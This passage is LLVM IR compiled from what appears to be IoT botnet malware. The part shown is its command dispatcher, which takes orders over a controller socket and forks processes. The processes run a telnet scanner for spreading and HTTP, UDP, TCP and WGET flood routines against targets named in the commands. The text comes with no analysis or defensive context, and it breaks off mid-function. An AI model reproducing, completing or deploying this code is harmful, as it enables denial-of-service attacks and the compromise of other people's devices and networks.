  %44 = load i8**, i8*** %4, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 0
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @strcmp(i8* %46, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.182, i32 0, i32 0)) #9
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %137, label %49

; <label>:49:                                     ; preds = %43
  %50 = load i8**, i8*** %4, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 1
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 @strcmp(i8* %52, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.183, i32 0, i32 0)) #9
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %100, label %55

; <label>:55:                                     ; preds = %49
  %56 = call i32 @fork() #5
  store i32 %56, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %57 = call i64 @sysconf(i32 84) #5
  %58 = trunc i64 %57 to i32
  store i32 %58, i32* %7, align 4
  store i32 999999, i32* %8, align 4
  %59 = load i32, i32* %7, align 4
  %60 = icmp eq i32 %59, 1
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %55
  store i32 500, i32* %8, align 4
  br label %62

; <label>:62:                                     ; preds = %61, %55
  %63 = load i32, i32* %7, align 4
  %64 = icmp sge i32 %63, 2
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  store i32 1000, i32* %8, align 4
  br label %66

; <label>:66:                                     ; preds = %65, %62
  %67 = load i32, i32* %5, align 4
  %68 = icmp ugt i32 %67, 0
  br i1 %68, label %69, label %71

; <label>:69:                                     ; preds = %66
  %70 = load i32, i32* %5, align 4
  store i32 %70, i32* @scanPid, align 4
  br label %681

; <label>:71:                                     ; preds = %66
  %72 = load i32, i32* %5, align 4
  %73 = icmp eq i32 %72, -1
  br i1 %73, label %74, label %75

; <label>:74:                                     ; preds = %71
  br label %681

; <label>:75:                                     ; preds = %71
  br label %76

; <label>:76:                                     ; preds = %75
  store i32 0, i32* %6, align 4
  br label %77

; <label>:77:                                     ; preds = %96, %76
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %7, align 4
  %80 = icmp slt i32 %78, %79
  br i1 %80, label %81, label %99

; <label>:81:                                     ; preds = %77
  %82 = call i64 @time(i64* null) #5
  %83 = call i32 @getpid() #5
  %84 = sext i32 %83 to i64
  %85 = xor i64 %82, %84
  %86 = call i32 @getppid() #5
  %87 = sext i32 %86 to i64
  %88 = add nsw i64 %85, %87
  %89 = trunc i64 %88 to i32
  call void @srand(i32 %89) #5
  %90 = call i64 @time(i64* null) #5
  %91 = call i32 @getpid() #5
  %92 = sext i32 %91 to i64
  %93 = xor i64 %90, %92
  %94 = trunc i64 %93 to i32
  call void @init_rand(i32 %94)
  %95 = load i32, i32* %8, align 4
  call void @TelnetScanner(i32 100, i32 %95)
  call void @_exit(i32 0) #11
  unreachable
                                                  ; No predecessors!
  %97 = load i32, i32* %6, align 4
  %98 = add nsw i32 %97, 1
  store i32 %98, i32* %6, align 4
  br label %77

; <label>:99:                                     ; preds = %77
  br label %100

; <label>:100:                                    ; preds = %99, %49
  %101 = load i8**, i8*** %4, align 8
  %102 = getelementptr inbounds i8*, i8** %101, i64 1
  %103 = load i8*, i8** %102, align 8
  %104 = call i32 @strcmp(i8* %103, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.184, i32 0, i32 0)) #9
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %113, label %106

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* @scanPid, align 4
  %108 = icmp eq i32 %107, 0
  br i1 %108, label %109, label %110

; <label>:109:                                    ; preds = %106
  br label %681

; <label>:110:                                    ; preds = %106
  %111 = load i32, i32* @scanPid, align 4
  %112 = call i32 @kill(i32 %111, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  br label %113

; <label>:113:                                    ; preds = %110, %100
  %114 = load i8**, i8*** %4, align 8
  %115 = getelementptr inbounds i8*, i8** %114, i64 1
  %116 = load i8*, i8** %115, align 8
  %117 = call i32 @strcmp(i8* %116, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.185, i32 0, i32 0)) #9
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %136, label %119

; <label>:119:                                    ; preds = %113
  %120 = load i8**, i8*** %4, align 8
  %121 = getelementptr inbounds i8*, i8** %120, i64 1
  %122 = load i8*, i8** %121, align 8
  %123 = call i32 @atoi(i8* %122) #9
  store i32 %123, i32* %9, align 4
  %124 = load i8**, i8*** %4, align 8
  %125 = getelementptr inbounds i8*, i8** %124, i64 2
  %126 = load i8*, i8** %125, align 8
  %127 = call i32 @atoi(i8* %126) #9
  store i32 %127, i32* %10, align 4
  %128 = call i32 @listFork()
  %129 = icmp ne i32 %128, 0
  br i1 %129, label %135, label %130

; <label>:130:                                    ; preds = %119
  %131 = load i32, i32* @mainCommSock, align 4
  %132 = call i32 (i32, i8*, ...) @sockprintf(i32 %131, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.186, i32 0, i32 0))
  %133 = load i32, i32* %10, align 4
  %134 = load i32, i32* %9, align 4
  call void @TelnetScanner(i32 %133, i32 %134)
  call void @_exit(i32 0) #11
  unreachable

; <label>:135:                                    ; preds = %119
  br label %681

; <label>:136:                                    ; preds = %113
  br label %137

; <label>:137:                                    ; preds = %136, %43
  %138 = load i8**, i8*** %4, align 8
  %139 = getelementptr inbounds i8*, i8** %138, i64 0
  %140 = load i8*, i8** %139, align 8
  %141 = call i32 @strcmp(i8* %140, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.187, i32 0, i32 0)) #9
  %142 = icmp ne i32 %141, 0
  br i1 %142, label %186, label %143

; <label>:143:                                    ; preds = %137
  %144 = load i32, i32* %3, align 4
  %145 = icmp slt i32 %144, 6
  br i1 %145, label %158, label %146

; <label>:146:                                    ; preds = %143
  %147 = load i8**, i8*** %4, align 8
  %148 = getelementptr inbounds i8*, i8** %147, i64 3
  %149 = load i8*, i8** %148, align 8
  %150 = call i32 @atoi(i8* %149) #9
  %151 = icmp slt i32 %150, 1
  br i1 %151, label %158, label %152

; <label>:152:                                    ; preds = %146
  %153 = load i8**, i8*** %4, align 8
  %154 = getelementptr inbounds i8*, i8** %153, i64 5
  %155 = load i8*, i8** %154, align 8
  %156 = call i32 @atoi(i8* %155) #9
  %157 = icmp slt i32 %156, 1
  br i1 %157, label %158, label %159

; <label>:158:                                    ; preds = %152, %146, %143
  br label %681

; <label>:159:                                    ; preds = %152
  %160 = call i32 @listFork()
  %161 = icmp ne i32 %160, 0
  br i1 %161, label %162, label %163

; <label>:162:                                    ; preds = %159
  br label %681

; <label>:163:                                    ; preds = %159
  %164 = load i8**, i8*** %4, align 8
  %165 = getelementptr inbounds i8*, i8** %164, i64 1
  %166 = load i8*, i8** %165, align 8
  %167 = load i8**, i8*** %4, align 8
  %168 = getelementptr inbounds i8*, i8** %167, i64 2
  %169 = load i8*, i8** %168, align 8
  %170 = load i8**, i8*** %4, align 8
  %171 = getelementptr inbounds i8*, i8** %170, i64 3
  %172 = load i8*, i8** %171, align 8
  %173 = call i32 @atoi(i8* %172) #9
  %174 = trunc i32 %173 to i16
  %175 = load i8**, i8*** %4, align 8
  %176 = getelementptr inbounds i8*, i8** %175, i64 4
  %177 = load i8*, i8** %176, align 8
  %178 = load i8**, i8*** %4, align 8
  %179 = getelementptr inbounds i8*, i8** %178, i64 5
  %180 = load i8*, i8** %179, align 8
  %181 = call i32 @atoi(i8* %180) #9
  %182 = load i8**, i8*** %4, align 8
  %183 = getelementptr inbounds i8*, i8** %182, i64 6
  %184 = load i8*, i8** %183, align 8
  %185 = call i32 @atoi(i8* %184) #9
  call void @SendHTTP(i8* %166, i8* %169, i16 zeroext %174, i8* %177, i32 %181, i32 %185)
  call void @exit(i32 0) #12
  unreachable

; <label>:186:                                    ; preds = %137
  %187 = load i8**, i8*** %4, align 8
  %188 = getelementptr inbounds i8*, i8** %187, i64 0
  %189 = load i8*, i8** %188, align 8
  %190 = call i32 @strcmp(i8* %189, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.188, i32 0, i32 0)) #9
  %191 = icmp ne i32 %190, 0
  br i1 %191, label %235, label %192

; <label>:192:                                    ; preds = %186
  %193 = load i32, i32* %3, align 4
  %194 = icmp slt i32 %193, 6
  br i1 %194, label %207, label %195

; <label>:195:                                    ; preds = %192
  %196 = load i8**, i8*** %4, align 8
  %197 = getelementptr inbounds i8*, i8** %196, i64 3
  %198 = load i8*, i8** %197, align 8
  %199 = call i32 @atoi(i8* %198) #9
  %200 = icmp slt i32 %199, 1
  br i1 %200, label %207, label %201

; <label>:201:                                    ; preds = %195
  %202 = load i8**, i8*** %4, align 8
  %203 = getelementptr inbounds i8*, i8** %202, i64 5
  %204 = load i8*, i8** %203, align 8
  %205 = call i32 @atoi(i8* %204) #9
  %206 = icmp slt i32 %205, 1
  br i1 %206, label %207, label %208

; <label>:207:                                    ; preds = %201, %195, %192
  br label %681

; <label>:208:                                    ; preds = %201
  %209 = call i32 @listFork()
  %210 = icmp ne i32 %209, 0
  br i1 %210, label %211, label %212

; <label>:211:                                    ; preds = %208
  br label %681

; <label>:212:                                    ; preds = %208
  %213 = load i8**, i8*** %4, align 8
  %214 = getelementptr inbounds i8*, i8** %213, i64 1
  %215 = load i8*, i8** %214, align 8
  %216 = load i8**, i8*** %4, align 8
  %217 = getelementptr inbounds i8*, i8** %216, i64 2
  %218 = load i8*, i8** %217, align 8
  %219 = load i8**, i8*** %4, align 8
  %220 = getelementptr inbounds i8*, i8** %219, i64 3
  %221 = load i8*, i8** %220, align 8
  %222 = call i32 @atoi(i8* %221) #9
  %223 = trunc i32 %222 to i16
  %224 = load i8**, i8*** %4, align 8
  %225 = getelementptr inbounds i8*, i8** %224, i64 4
  %226 = load i8*, i8** %225, align 8
  %227 = load i8**, i8*** %4, align 8
  %228 = getelementptr inbounds i8*, i8** %227, i64 5
  %229 = load i8*, i8** %228, align 8
  %230 = call i32 @atoi(i8* %229) #9
  %231 = load i8**, i8*** %4, align 8
  %232 = getelementptr inbounds i8*, i8** %231, i64 6
  %233 = load i8*, i8** %232, align 8
  %234 = call i32 @atoi(i8* %233) #9
  call void @SendHTTPHEX(i8* %215, i8* %218, i16 zeroext %223, i8* %226, i32 %230, i32 %234)
  call void @exit(i32 0) #12
  unreachable

; <label>:235:                                    ; preds = %186
  %236 = load i8**, i8*** %4, align 8
  %237 = getelementptr inbounds i8*, i8** %236, i64 0
  %238 = load i8*, i8** %237, align 8
  %239 = call i32 @strcmp(i8* %238, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.189, i32 0, i32 0)) #9
  %240 = icmp ne i32 %239, 0
  br i1 %240, label %284, label %241

; <label>:241:                                    ; preds = %235
  %242 = load i32, i32* %3, align 4
  %243 = icmp slt i32 %242, 6
  br i1 %243, label %256, label %244

; <label>:244:                                    ; preds = %241
  %245 = load i8**, i8*** %4, align 8
  %246 = getelementptr inbounds i8*, i8** %245, i64 3
  %247 = load i8*, i8** %246, align 8
  %248 = call i32 @atoi(i8* %247) #9
  %249 = icmp slt i32 %248, 1
  br i1 %249, label %256, label %250

; <label>:250:                                    ; preds = %244
  %251 = load i8**, i8*** %4, align 8
  %252 = getelementptr inbounds i8*, i8** %251, i64 5
  %253 = load i8*, i8** %252, align 8
  %254 = call i32 @atoi(i8* %253) #9
  %255 = icmp slt i32 %254, 1
  br i1 %255, label %256, label %257

; <label>:256:                                    ; preds = %250, %244, %241
  br label %681

; <label>:257:                                    ; preds = %250
  %258 = call i32 @listFork()
  %259 = icmp ne i32 %258, 0
  br i1 %259, label %260, label %261

; <label>:260:                                    ; preds = %257
  br label %681

; <label>:261:                                    ; preds = %257
  %262 = load i8**, i8*** %4, align 8
  %263 = getelementptr inbounds i8*, i8** %262, i64 1
  %264 = load i8*, i8** %263, align 8
  %265 = load i8**, i8*** %4, align 8
  %266 = getelementptr inbounds i8*, i8** %265, i64 2
  %267 = load i8*, i8** %266, align 8
  %268 = load i8**, i8*** %4, align 8
  %269 = getelementptr inbounds i8*, i8** %268, i64 3
  %270 = load i8*, i8** %269, align 8
  %271 = call i32 @atoi(i8* %270) #9
  %272 = trunc i32 %271 to i16
  %273 = load i8**, i8*** %4, align 8
  %274 = getelementptr inbounds i8*, i8** %273, i64 4
  %275 = load i8*, i8** %274, align 8
  %276 = load i8**, i8*** %4, align 8
  %277 = getelementptr inbounds i8*, i8** %276, i64 5
  %278 = load i8*, i8** %277, align 8
  %279 = call i32 @atoi(i8* %278) #9
  %280 = load i8**, i8*** %4, align 8
  %281 = getelementptr inbounds i8*, i8** %280, i64 6
  %282 = load i8*, i8** %281, align 8
  %283 = call i32 @atoi(i8* %282) #9
  call void @SendHTTPTXT(i8* %264, i8* %267, i16 zeroext %272, i8* %275, i32 %279, i32 %283)
  call void @exit(i32 0) #12
  unreachable

; <label>:284:                                    ; preds = %235
  %285 = load i8**, i8*** %4, align 8
  %286 = getelementptr inbounds i8*, i8** %285, i64 0
  %287 = load i8*, i8** %286, align 8
  %288 = call i32 @strcmp(i8* %287, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.190, i32 0, i32 0)) #9
  %289 = icmp ne i32 %288, 0
  br i1 %289, label %352, label %290

; <label>:290:                                    ; preds = %284
  %291 = load i32, i32* %3, align 4
  %292 = icmp slt i32 %291, 3
  br i1 %292, label %299, label %293

; <label>:293:                                    ; preds = %290
  %294 = load i8**, i8*** %4, align 8
  %295 = getelementptr inbounds i8*, i8** %294, i64 2
  %296 = load i8*, i8** %295, align 8
  %297 = call i32 @atoi(i8* %296) #9
  %298 = icmp slt i32 %297, 1
  br i1 %298, label %299, label %300

; <label>:299:                                    ; preds = %293, %290
  br label %681

; <label>:300:                                    ; preds = %293
  %301 = load i8**, i8*** %4, align 8
  %302 = getelementptr inbounds i8*, i8** %301, i64 1
  %303 = load i8*, i8** %302, align 8
  store i8* %303, i8** %11, align 8
  %304 = load i8**, i8*** %4, align 8
  %305 = getelementptr inbounds i8*, i8** %304, i64 2
  %306 = load i8*, i8** %305, align 8
  %307 = call i32 @atoi(i8* %306) #9
  store i32 %307, i32* %12, align 4
  %308 = load i8*, i8** %11, align 8
  %309 = call i8* @strstr(i8* %308, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #9
  %310 = icmp ne i8* %309, null
  br i1 %310, label %311, label %335

; <label>:311:                                    ; preds = %300
  %312 = load i8*, i8** %11, align 8
  %313 = call i8* @strtok(i8* %312, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %313, i8** %13, align 8
  br label %314

; <label>:314:                                    ; preds = %332, %311
  %315 = load i8*, i8** %13, align 8
  %316 = icmp ne i8* %315, null
  br i1 %316, label %317, label %334

; <label>:317:                                    ; preds = %314
  %318 = call i32 @listFork()
  %319 = icmp ne i32 %318, 0
  br i1 %319, label %332, label %320

; <label>:320:                                    ; preds = %317
  store i32 0, i32* %14, align 4
  br label %321

; <label>:321:                                    ; preds = %324, %320
  %322 = load i32, i32* %14, align 4
  %323 = icmp slt i32 %322, 10
  br i1 %323, label %324, label %329

; <label>:324:                                    ; preds = %321
  %325 = load i8*, i8** %11, align 8
  %326 = load i32, i32* %12, align 4
  call void @SendWGET(i8* %325, i32 %326)
  %327 = load i32, i32* %14, align 4
  %328 = add nsw i32 %327, 1
  store i32 %328, i32* %14, align 4
  br label %321

; <label>:329:                                    ; preds = %321
  %330 = load i32, i32* @mainCommSock, align 4
  %331 = call i32 @close(i32 %330)
  call void @_exit(i32 0) #11
  unreachable

; <label>:332:                                    ; preds = %317
  %333 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %333, i8** %13, align 8
  br label %314

; <label>:334:                                    ; preds = %314
  br label %351

; <label>:335:                                    ; preds = %300
  %336 = call i32 @listFork()
  %337 = icmp ne i32 %336, 0
  br i1 %337, label %338, label %339

; <label>:338:                                    ; preds = %335
  br label %681

; <label>:339:                                    ; preds = %335
  store i32 0, i32* %15, align 4
  br label %340

; <label>:340:                                    ; preds = %343, %339
  %341 = load i32, i32* %15, align 4
  %342 = icmp slt i32 %341, 10
  br i1 %342, label %343, label %348

; <label>:343:                                    ; preds = %340
  %344 = load i8*, i8** %11, align 8
  %345 = load i32, i32* %12, align 4
  call void @SendWGET(i8* %344, i32 %345)
  %346 = load i32, i32* %15, align 4
  %347 = add nsw i32 %346, 1
  store i32 %347, i32* %15, align 4
  br label %340

; <label>:348:                                    ; preds = %340
  %349 = load i32, i32* @mainCommSock, align 4
  %350 = call i32 @close(i32 %349)
  call void @_exit(i32 0) #11
  unreachable

; <label>:351:                                    ; preds = %334
  br label %352

; <label>:352:                                    ; preds = %351, %284
  %353 = load i8**, i8*** %4, align 8
  %354 = getelementptr inbounds i8*, i8** %353, i64 0
  %355 = load i8*, i8** %354, align 8
  %356 = call i32 @strcmp(i8* %355, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.191, i32 0, i32 0)) #9
  %357 = icmp ne i32 %356, 0
  br i1 %357, label %455, label %358

; <label>:358:                                    ; preds = %352
  %359 = load i32, i32* %3, align 4
  %360 = icmp slt i32 %359, 6
  br i1 %360, label %394, label %361

; <label>:361:                                    ; preds = %358
  %362 = load i8**, i8*** %4, align 8
  %363 = getelementptr inbounds i8*, i8** %362, i64 3
  %364 = load i8*, i8** %363, align 8
  %365 = call i32 @atoi(i8* %364) #9
  %366 = icmp eq i32 %365, -1
  br i1 %366, label %394, label %367

; <label>:367:                                    ; preds = %361
  %368 = load i8**, i8*** %4, align 8
  %369 = getelementptr inbounds i8*, i8** %368, i64 2
  %370 = load i8*, i8** %369, align 8
  %371 = call i32 @atoi(i8* %370) #9
  %372 = icmp eq i32 %371, -1
  br i1 %372, label %394, label %373

; <label>:373:                                    ; preds = %367
  %374 = load i8**, i8*** %4, align 8
  %375 = getelementptr inbounds i8*, i8** %374, i64 4
  %376 = load i8*, i8** %375, align 8
  %377 = call i32 @atoi(i8* %376) #9
  %378 = icmp eq i32 %377, -1
  br i1 %378, label %394, label %379

; <label>:379:                                    ; preds = %373
  %380 = load i8**, i8*** %4, align 8
  %381 = getelementptr inbounds i8*, i8** %380, i64 4
  %382 = load i8*, i8** %381, align 8
  %383 = call i32 @atoi(i8* %382) #9
  %384 = icmp sgt i32 %383, 1024
  br i1 %384, label %394, label %385

; <label>:385:                                    ; preds = %379
  %386 = load i32, i32* %3, align 4
  %387 = icmp eq i32 %386, 6
  br i1 %387, label %388, label %395

; <label>:388:                                    ; preds = %385
  %389 = load i8**, i8*** %4, align 8
  %390 = getelementptr inbounds i8*, i8** %389, i64 5
  %391 = load i8*, i8** %390, align 8
  %392 = call i32 @atoi(i8* %391) #9
  %393 = icmp slt i32 %392, 1
  br i1 %393, label %394, label %395

; <label>:394:                                    ; preds = %388, %379, %373, %367, %361, %358
  br label %681

; <label>:395:                                    ; preds = %388, %385
  %396 = load i8**, i8*** %4, align 8
  %397 = getelementptr inbounds i8*, i8** %396, i64 1
  %398 = load i8*, i8** %397, align 8
  store i8* %398, i8** %16, align 8
  %399 = load i8**, i8*** %4, align 8
  %400 = getelementptr inbounds i8*, i8** %399, i64 2
  %401 = load i8*, i8** %400, align 8
  %402 = call i32 @atoi(i8* %401) #9
  store i32 %402, i32* %17, align 4
  %403 = load i8**, i8*** %4, align 8
  %404 = getelementptr inbounds i8*, i8** %403, i64 3
  %405 = load i8*, i8** %404, align 8
  %406 = call i32 @atoi(i8* %405) #9
  store i32 %406, i32* %18, align 4
  %407 = load i8**, i8*** %4, align 8
  %408 = getelementptr inbounds i8*, i8** %407, i64 4
  %409 = load i8*, i8** %408, align 8
  %410 = call i32 @atoi(i8* %409) #9
  store i32 %410, i32* %19, align 4
  %411 = load i32, i32* %3, align 4
  %412 = icmp eq i32 %411, 6
  br i1 %412, label %413, label %418

; <label>:413:                                    ; preds = %395
  %414 = load i8**, i8*** %4, align 8
  %415 = getelementptr inbounds i8*, i8** %414, i64 5
  %416 = load i8*, i8** %415, align 8
  %417 = call i32 @atoi(i8* %416) #9
  br label %419

; <label>:418:                                    ; preds = %395
  br label %419

; <label>:419:                                    ; preds = %418, %413
  %420 = phi i32 [ %417, %413 ], [ 10, %418 ]
  store i32 %420, i32* %20, align 4
  store i32 32, i32* %21, align 4
  %421 = load i8*, i8** %16, align 8
  %422 = call i8* @strstr(i8* %421, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #9
  %423 = icmp ne i8* %422, null
  br i1 %423, label %424, label %443

; <label>:424:                                    ; preds = %419
  %425 = load i8*, i8** %16, align 8
  %426 = call i8* @strtok(i8* %425, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %426, i8** %22, align 8
  br label %427

; <label>:427:                                    ; preds = %440, %424
  %428 = load i8*, i8** %22, align 8
  %429 = icmp ne i8* %428, null
  br i1 %429, label %430, label %442

; <label>:430:                                    ; preds = %427
  %431 = call i32 @listFork()
  %432 = icmp ne i32 %431, 0
  br i1 %432, label %440, label %433

; <label>:433:                                    ; preds = %430
  %434 = load i8*, i8** %22, align 8
  %435 = load i32, i32* %17, align 4
  %436 = load i32, i32* %18, align 4
  %437 = load i32, i32* %19, align 4
  %438 = load i32, i32* %20, align 4
  %439 = load i32, i32* %21, align 4
  call void @SendUDP(i8* %434, i32 %435, i32 %436, i32 %437, i32 %438, i32 %439)
  call void @_exit(i32 0) #11
  unreachable

; <label>:440:                                    ; preds = %430
  %441 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %441, i8** %22, align 8
  br label %427

; <label>:442:                                    ; preds = %427
  br label %454

; <label>:443:                                    ; preds = %419
  %444 = call i32 @listFork()
  %445 = icmp ne i32 %444, 0
  br i1 %445, label %446, label %447

; <label>:446:                                    ; preds = %443
  br label %681

; <label>:447:                                    ; preds = %443
  %448 = load i8*, i8** %16, align 8
  %449 = load i32, i32* %17, align 4
  %450 = load i32, i32* %18, align 4
  %451 = load i32, i32* %19, align 4
  %452 = load i32, i32* %20, align 4
  %453 = load i32, i32* %21, align 4
  call void @SendUDP(i8* %448, i32 %449, i32 %450, i32 %451, i32 %452, i32 %453)
  call void @_exit(i32 0) #11
  unreachable

; <label>:454:                                    ; preds = %442
  br label %455

; <label>:455:                                    ; preds = %454, %352
  %456 = load i8**, i8*** %4, align 8
  %457 = getelementptr inbounds i8*, i8** %456, i64 0
  %458 = load i8*, i8** %457, align 8
  %459 = call i32 @strcmp(i8* %458, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.192, i32 0, i32 0)) #9
  %460 = icmp ne i32 %459, 0
  br i1 %460, label %566, label %461

; <label>:461:                                    ; preds = %455
  %462 = load i32, i32* %3, align 4
  %463 = icmp slt i32 %462, 6
  br i1 %463, label %494, label %464

; <label>:464:                                    ; preds = %461
  %465 = load i8**, i8*** %4, align 8
  %466 = getelementptr inbounds i8*, i8** %465, i64 3
  %467 = load i8*, i8** %466, align 8
  %468 = call i32 @atoi(i8* %467) #9
  %469 = icmp eq i32 %468, -1
  br i1 %469, label %494, label %470

; <label>:470:                                    ; preds = %464
  %471 = load i8**, i8*** %4, align 8
  %472 = getelementptr inbounds i8*, i8** %471, i64 2
  %473 = load i8*, i8** %472, align 8
  %474 = call i32 @atoi(i8* %473) #9
  %475 = icmp eq i32 %474, -1
  br i1 %475, label %494, label %476

; <label>:476:                                    ; preds = %470
  %477 = load i32, i32* %3, align 4
  %478 = icmp sgt i32 %477, 5
  br i1 %478, label %479, label %485

; <label>:479:                                    ; preds = %476
  %480 = load i8**, i8*** %4, align 8
  %481 = getelementptr inbounds i8*, i8** %480, i64 5
  %482 = load i8*, i8** %481, align 8
  %483 = call i32 @atoi(i8* %482) #9
  %484 = icmp slt i32 %483, 0
  br i1 %484, label %494, label %485

; <label>:485:                                    ; preds = %479, %476
  %486 = load i32, i32* %3, align 4
  %487 = icmp eq i32 %486, 7
  br i1 %487, label %488, label %495

; <label>:488:                                    ; preds = %485
  %489 = load i8**, i8*** %4, align 8
  %490 = getelementptr inbounds i8*, i8** %489, i64 6
  %491 = load i8*, i8** %490, align 8
  %492 = call i32 @atoi(i8* %491) #9
  %493 = icmp slt i32 %492, 1
  br i1 %493, label %494, label %495

; <label>:494:                                    ; preds = %488, %479, %470, %464, %461
  br label %681

; <label>:495:                                    ; preds = %488, %485
  %496 = load i8**, i8*** %4, align 8
  %497 = getelementptr inbounds i8*, i8** %496, i64 1
  %498 = load i8*, i8** %497, align 8
  store i8* %498, i8** %23, align 8
  %499 = load i8**, i8*** %4, align 8
  %500 = getelementptr inbounds i8*, i8** %499, i64 2
  %501 = load i8*, i8** %500, align 8
  %502 = call i32 @atoi(i8* %501) #9
  store i32 %502, i32* %24, align 4
  %503 = load i8**, i8*** %4, align 8
  %504 = getelementptr inbounds i8*, i8** %503, i64 3
  %505 = load i8*, i8** %504, align 8
  %506 = call i32 @atoi(i8* %505) #9
  store i32 %506, i32* %25, align 4
  %507 = load i8**, i8*** %4, align 8
  %508 = getelementptr inbounds i8*, i8** %507, i64 4
  %509 = load i8*, i8** %508, align 8
  store i8* %509, i8** %26, align 8
  %510 = load i32, i32* %3, align 4
  %511 = icmp eq i32 %510, 7
  br i1 %511, label %512, label %517

; <label>:512:                                    ; preds = %495
  %513 = load i8**, i8*** %4, align 8
  %514 = getelementptr inbounds i8*, i8** %513, i64 6
  %515 = load i8*, i8** %514, align 8
  %516 = call i32 @atoi(i8* %515) #9
  br label %518

; <label>:517:                                    ; preds = %495
  br label %518

; <label>:518:                                    ; preds = %517, %512
  %519 = phi i32 [ %516, %512 ], [ 10, %517 ]
  store i32 %519, i32* %27, align 4
  %520 = load i32, i32* %3, align 4
  %521 = icmp sgt i32 %520, 5
  br i1 %521, label %522, label %527

; <label>:522:                                    ; preds = %518
  %523 = load i8**, i8*** %4, align 8
  %524 = getelementptr inbounds i8*, i8** %523, i64 5
  %525 = load i8*, i8** %524, align 8
  %526 = call i32 @atoi(i8* %525) #9
  br label %528

; <label>:527:                                    ; preds = %518
  br label %528

; <label>:528:                                    ; preds = %527, %522
  %529 = phi i32 [ %526, %522 ], [ 0, %527 ]
  store i32 %529, i32* %28, align 4
  store i32 32, i32* %29, align 4
  %530 = load i8*, i8** %23, align 8
  %531 = call i8* @strstr(i8* %530, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #9
  %532 = icmp ne i8* %531, null
  br i1 %532, label %533, label %553

; <label>:533:                                    ; preds = %528
  %534 = load i8*, i8** %23, align 8
  %535 = call i8* @strtok(i8* %534, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %535, i8** %30, align 8
  br label %536

; <label>:536:                                    ; preds = %550, %533
  %537 = load i8*, i8** %30, align 8
  %538 = icmp ne i8* %537, null
  br i1 %538, label %539, label %552

; <label>:539:                                    ; preds = %536
  %540 = call i32 @listFork()
  %541 = icmp ne i32 %540, 0
  br i1 %541, label %550, label %542

; <label>:542:                                    ; preds = %539
  %543 = load i8*, i8** %30, align 8
  %544 = load i32, i32* %24, align 4
  %545 = load i32, i32* %25, align 4
  %546 = load i8*, i8** %26, align 8
  %547 = load i32, i32* %28, align 4
  %548 = load i32, i32* %27, align 4
  %549 = load i32, i32* %29, align 4
  call void @SendTCP(i8* %543, i32 %544, i32 %545, i8* %546, i32 %547, i32 %548, i32 %549)
  call void @_exit(i32 0) #11
  unreachable

; <label>:550:                                    ; preds = %539
  %551 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %551, i8** %30, align 8
  br label %536

; <label>:552:                                    ; preds = %536
  br label %565

; <label>:553:                                    ; preds = %528
  %554 = call i32 @listFork()
  %555 = icmp ne i32 %554, 0
  br i1 %555, label %556, label %557

; <label>:556:                                    ; preds = %553
  br label %681

; <label>:557:                                    ; preds = %553
  %558 = load i8*, i8** %23, align 8
  %559 = load i32, i32* %24, align 4
  %560 = load i32, i32* %25, align 4
  %561 = load i8*, i8** %26, align 8
  %562 = load i32, i32* %28, align 4
  %563 = load i32, i32* %27, align 4
  %564 = load i32, i32* %29, align 4
  call void @SendTCP(i8* %558, i32 %559, i32 %560, i8* %561, i32 %562, i32 %563, i32 %564)
  call void @_exit(i32 0) #11
  unreachable

; <label>:565:                                    ; preds = %552
  br label %566

; <label>:566:                                    ; preds = %565, %455
  %567 = load i8**, i8*** %4, align 8
  %568 = getelementptr inbounds i8*, i8** %567, i64 0
  %569 = load i8*, i8** %568, align 8
  %570 = call i32 @strcmp(i8* %569, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.193, i32 0, i32 0)) #9
  %571 = icmp ne i32 %570, 0
  br i1 %571, label %628, label %572

; <label>:572:                                    ; preds = %566
  %573 = load i32, i32* %3, align 4
  %574 = icmp slt i32 %573, 4
  br i1 %574, label %587, label %575

; <label>:575:                                    ; preds = %572
  %576 = load i8**, i8*** %4, align 8
  %577 = getelementptr inbounds i8*, i8** %576, i64 2
  %578 = load i8*, i8** %577, align 8
  %579 = call i32 @atoi(i8* %578) #9
  %580 = icmp slt i32 %579, 1
  br i1 %580, label %587, label %581

; <label>:581:                                    ; preds = %575
  %582 = load i8**, i8*** %4, align 8
  %583 = getelementptr inbounds i8*, i8** %582, i64 3
  %584 = load i8*, i8** %583, align 8
